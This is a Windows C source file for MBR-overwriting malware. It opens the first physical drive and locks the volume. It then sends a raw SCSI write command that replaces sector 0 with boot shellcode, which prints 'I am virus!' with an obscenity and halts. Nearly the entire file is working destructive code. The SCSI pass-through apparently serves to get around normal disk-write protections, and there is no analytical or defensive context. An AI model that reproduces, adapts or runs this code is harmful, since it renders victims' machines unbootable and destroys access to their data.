#include <Windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <ntddscsi.h>
unsigned char scode[] =
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
"\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";
#define SPT_SENSE_LENGTH 32

typedef struct _SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER {
    SCSI_PASS_THROUGH_DIRECT sptd;
    ULONG                  Filler;           // realign buffer to double word boundary
    UCHAR                  ucSenseBuf[SPT_SENSE_LENGTH];
} SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER, * PSCSI_PASS_THROUGH_DIRECT_WITH_BUFFER;

int main()
{
    unsigned long dwBytesReturned;
    unsigned char pMBR[512] = { 0 };
    SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER sptdwb;
    int posSector = 0;   //从第0个扇区开始写，扇区编号从0开始
    int writeSectors = 1; //写1个扇区
    bool bRet;

    memcpy(pMBR, scode, sizeof(scode));
    pMBR[510] = 0x55;
    pMBR[511] = 0xaa;

    HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Oops, Failed!");
        system("pause");
        return -1;
    }
    if (!DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL))
    {
        printf("FSCTL_LOCK_VOLUME DeviceIoControl, Failed!");
        system("pause");
        return -1;
    }
    ZeroMemory(&sptdwb, sizeof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER));
    sptdwb.sptd.Length = sizeof(SCSI_PASS_THROUGH_DIRECT);
    sptdwb.sptd.PathId = 0;
    sptdwb.sptd.TargetId = 1;
    sptdwb.sptd.Lun = 0;
    sptdwb.sptd.CdbLength = 10; //SCSI命令长度
    sptdwb.sptd.DataIn = SCSI_IOCTL_DATA_IN;
    sptdwb.sptd.SenseInfoLength = 24;
    sptdwb.sptd.DataTransferLength = 512; //写数据量
    sptdwb.sptd.TimeOutValue = 2;
    sptdwb.sptd.DataBuffer = pMBR;
    sptdwb.sptd.SenseInfoOffset = offsetof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER, ucSenseBuf);
    sptdwb.sptd.Cdb[0] = 0x2A;          //写数据命令
    sptdwb.sptd.Cdb[2] = (posSector >> 24) & 0xff; //从第posSector开始写
    sptdwb.sptd.Cdb[3] = (posSector >> 16) & 0xff;
    sptdwb.sptd.Cdb[4] = (posSector >> 8) & 0xff;
    sptdwb.sptd.Cdb[5] = posSector & 0xff;
    sptdwb.sptd.Cdb[7] = (writeSectors >> 8) & 0xff;
    sptdwb.sptd.Cdb[8] = writeSectors & 0xff;   //写readSectors个扇区 ,注意这个值一定要与DataTransferLength相对应
    ULONG length = sizeof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER);
    bRet = DeviceIoControl(
        hDevice,
        IOCTL_SCSI_PASS_THROUGH_DIRECT,
        &sptdwb,
        length,
        &sptdwb,
        length,
        &dwBytesReturned,
        FALSE
    );
    if (!bRet)
    {
        printf("WriteFile \\\\.\\PhysicalDrive0  bytes failed. Error=%u\n", GetLastError());
        system("pause");
        return -1;
    }
    //WriteFile(hDevice, pMBR, 512, &dwBytesReturned, NULL);
    DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
    CloseHandle(hDevice);
    system("pause");
    return 0;
}

